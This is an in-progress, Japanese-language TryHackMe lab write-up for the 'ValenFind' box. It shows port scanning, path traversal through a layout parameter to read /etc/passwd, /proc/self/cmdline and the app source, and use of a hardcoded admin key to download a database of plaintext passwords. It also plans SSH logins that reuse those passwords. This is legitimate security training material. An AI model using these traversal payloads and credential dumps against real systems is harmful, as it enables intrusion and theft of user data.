---
tags: [hacking, box, writeup]
platform: TryHackMe
difficulty: Unknown
status: in-progress
date: 2026-03-20
ip: 10.48.130.17
skills:
  - web enumeration
  - LFI (Local File Inclusion)
  - Path Traversal
  - SSRF (Server-Side Request Forgery)
  - ソースコード読解
---

# ValenFind - Secure Dating

**プラットフォーム**: TryHackMe
**IP**: `10.48.130.17`
**OS**: Linux (Ubuntu)

---

## 情報収集

### ポートスキャン (RustScan + Nmap)

```bash
rustscan -a 10.48.130.17 --ulimit 5000 -- -sC -sV
```

**開いているポート:**

| ポート | サービス | バージョン | 備考 |
|-------|---------|----------|------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 | |
| 5000/tcp | HTTP | Werkzeug/3.0.1 Python/3.12.3 | Python Flask アプリ |

**気づき:**
- Webアプリは Python Flask (Werkzeug) で動作
- ポート 5000 はデフォルトの Flask 開発サーバーポート

---

### Webアプリ調査

**URL**: `http://10.48.130.17:5000`

#### アカウント登録 / ログイン
- テストアカウント作成成功: `testuser / password`

#### ログイン後に発見したエンドポイント

| エンドポイント | 説明 |
|-------------|------|
| `/dashboard` | ユーザー一覧 (マッチング候補) |
| `/my_profile` | 自分のプロフィール編集 |
| `/profile/<username>` | 他ユーザーのプロフィール表示 |
| `/like/<id>` | いいね機能 (POST) |
| `/api/fetch_layout?layout=` | **← SSRF/LFI脆弱性の入口** |
| `/api/admin/export_db` | **← 管理者専用DB取得エンドポイント** |

#### ダッシュボードで発見したユーザー一覧

| ID | ユーザー名 | Likes | 備考 |
|----|----------|-------|------|
| 1 | romeo_montague | 14 | |
| 2 | casanova_official | 5 | |
| 3 | cleopatra_queen | 88 | |
| 4 | sherlock_h | 21 | |
| 5 | gatsby_great | 105 | |
| 6 | jane_eyre | 33 | |
| 7 | count_dracula | 666 | |
| 8 | cupid | 999 | **管理者アカウント** |

---

## 脆弱性発見・攻撃の流れ

### Step 1: SSRF/LFI の発見

`cupid` のプロフィールページ (`/profile/cupid`) のJavaScriptに怪しいコードを発見:

```javascript
function loadTheme(layoutName) {
    fetch(`/api/fetch_layout?layout=${layoutName}`)
        .then(r => r.text())
        .then(html => {
            document.getElementById('bio-container').innerHTML = rendered;
        });
}
```

`?layout=` パラメータにファイル名を渡すと、**サーバーがそのファイルを読んで返す**構造。
→ パストラバーサル (`../`) でサーバー内の任意ファイルを読める可能性がある。

---

### Step 2: パストラバーサルで `/etc/passwd` 取得

```bash
curl -b cookies.txt "http://10.48.130.17:5000/api/fetch_layout?layout=../../../../etc/passwd"
```

**結果: 成功** `/etc/passwd` の内容が取得できた。

**ログイン可能なユーザー (シェルあり):**
```
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

---

### Step 3: プロセス情報からアプリの場所を特定

```bash
curl -b cookies.txt "http://10.48.130.17:5000/api/fetch_layout?layout=../../../../proc/self/cmdline"
# 結果: /usr/bin/python3 /opt/Valenfind/app.py
```

アプリは `/opt/Valenfind/app.py` にあることが判明。

---

### Step 4: ソースコード (app.py) を取得

```bash
curl -b cookies.txt "http://10.48.130.17:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"
```

**結果: 成功** ソースコード全体を取得。

---

## ソースコードから発見した重要情報

### 発見1: 管理者APIキーがハードコード

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

本番コードにAPIキーをベタ書きするのは重大なセキュリティミス。

### 発見2: DBをダウンロードできる隠しエンドポイント

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file('cupid.db', as_attachment=True)  # DB丸ごとダウンロード
    else:
        return jsonify({"error": "Forbidden"}), 403
```

`X-Valentine-Token` ヘッダーにAPIキーを付けてリクエストすれば全ユーザーのDBが取得できる。

### 発見3: パスワードが平文保存

```python
# ログイン処理
if user and user['password'] == password:  # ハッシュ化なし！
```

パスワードが平文のままDBに保存されている = DBを取得すれば全員のパスワードがわかる。

### 発見4: fetch_layout のフィルターは不完全

```python
# app.py の fetch_layout 関数
if 'cupid.db' in layout_file or layout_file.endswith('.db'):
    return "Security Alert: Database file access is strictly prohibited."
if 'seeder.py' in layout_file:
    return "Security Alert: Configuration file access is strictly prohibited."
# → ../.. でのパストラバーサルは防いでいない！
```

---

## 次のステップ

- [x] `/api/admin/export_db` に管理者APIキーを付けてDBをダウンロード
- [x] DBからパスワードを取得
- [ ] SSHで `ubuntu` or `root` へのログイン試行
- [ ] `user.txt` / `root.txt` の取得

---

## 侵入 / Initial Access

### DBダウンロード (成功)

```bash
curl -o cupid.db \
  -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
  "http://10.48.130.17:5000/api/admin/export_db"

sqlite3 cupid.db "SELECT id, username, password, real_name, email FROM users;"
```

### 取得したユーザー情報 (全員平文パスワード)

| ID | ユーザー名 | パスワード | 本名 | メール |
|----|----------|-----------|------|--------|
| 1 | romeo_montague | juliet123 | Romeo Montague | romeo@verona.cupid |
| 2 | casanova_official | secret123 | Giacomo Casanova | loverboy@venice.kiss |
| 3 | cleopatra_queen | caesar_salad | Cleopatra VII Philopator | queen@nile.river |
| 4 | sherlock_h | watson_is_cool | Sherlock Holmes | detective@baker.street |
| 5 | gatsby_great | green_light | Jay Gatsby | jay@westegg.party |
| 6 | jane_eyre | rochester_blind | Jane Eyre | jane@thornfield.book |
| 7 | count_dracula | sunlight_sucks | Vlad Dracula | vlad@night.walker |
| 8 | **cupid** | **admin_root_x99** | System Administrator | cupid@internal.cupid |
| 9 | testuser | password | (自作アカウント) | |

### 次に試すSSHログイン (未実施)

```bash
# cupid は管理者 → パスワード使い回しの可能性
ssh cupid@10.48.130.17      # password: admin_root_x99
ssh ubuntu@10.48.130.17     # password: admin_root_x99 (使い回し?)
```

**ユーザーフラグ**: `user.txt` →

---

## 権限昇格 / Privilege Escalation

### 調査
```bash
# sudo -l, SUID, cron, etc.
```

### 昇格手順
-

**ルートフラグ**: `root.txt` →

---

## 習得スキル・学び

- **パストラバーサル**: `../` を繰り返してWebルートの外のファイルを読む手法
- **LFI (Local File Inclusion)**: サーバー上のファイルをWebから読み取る脆弱性
- **調査の順番**: `/etc/passwd` → `/proc/self/cmdline` → アプリのソースコード
- **ソースコード読解**: ハードコードされた秘密情報・隠しエンドポイント・認証バイパスを探す
- **平文パスワード保存の危険性**: DBが漏れると全ユーザーのパスワードが即座に判明

## ハマったポイント
-

## 参考にしたリソース
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
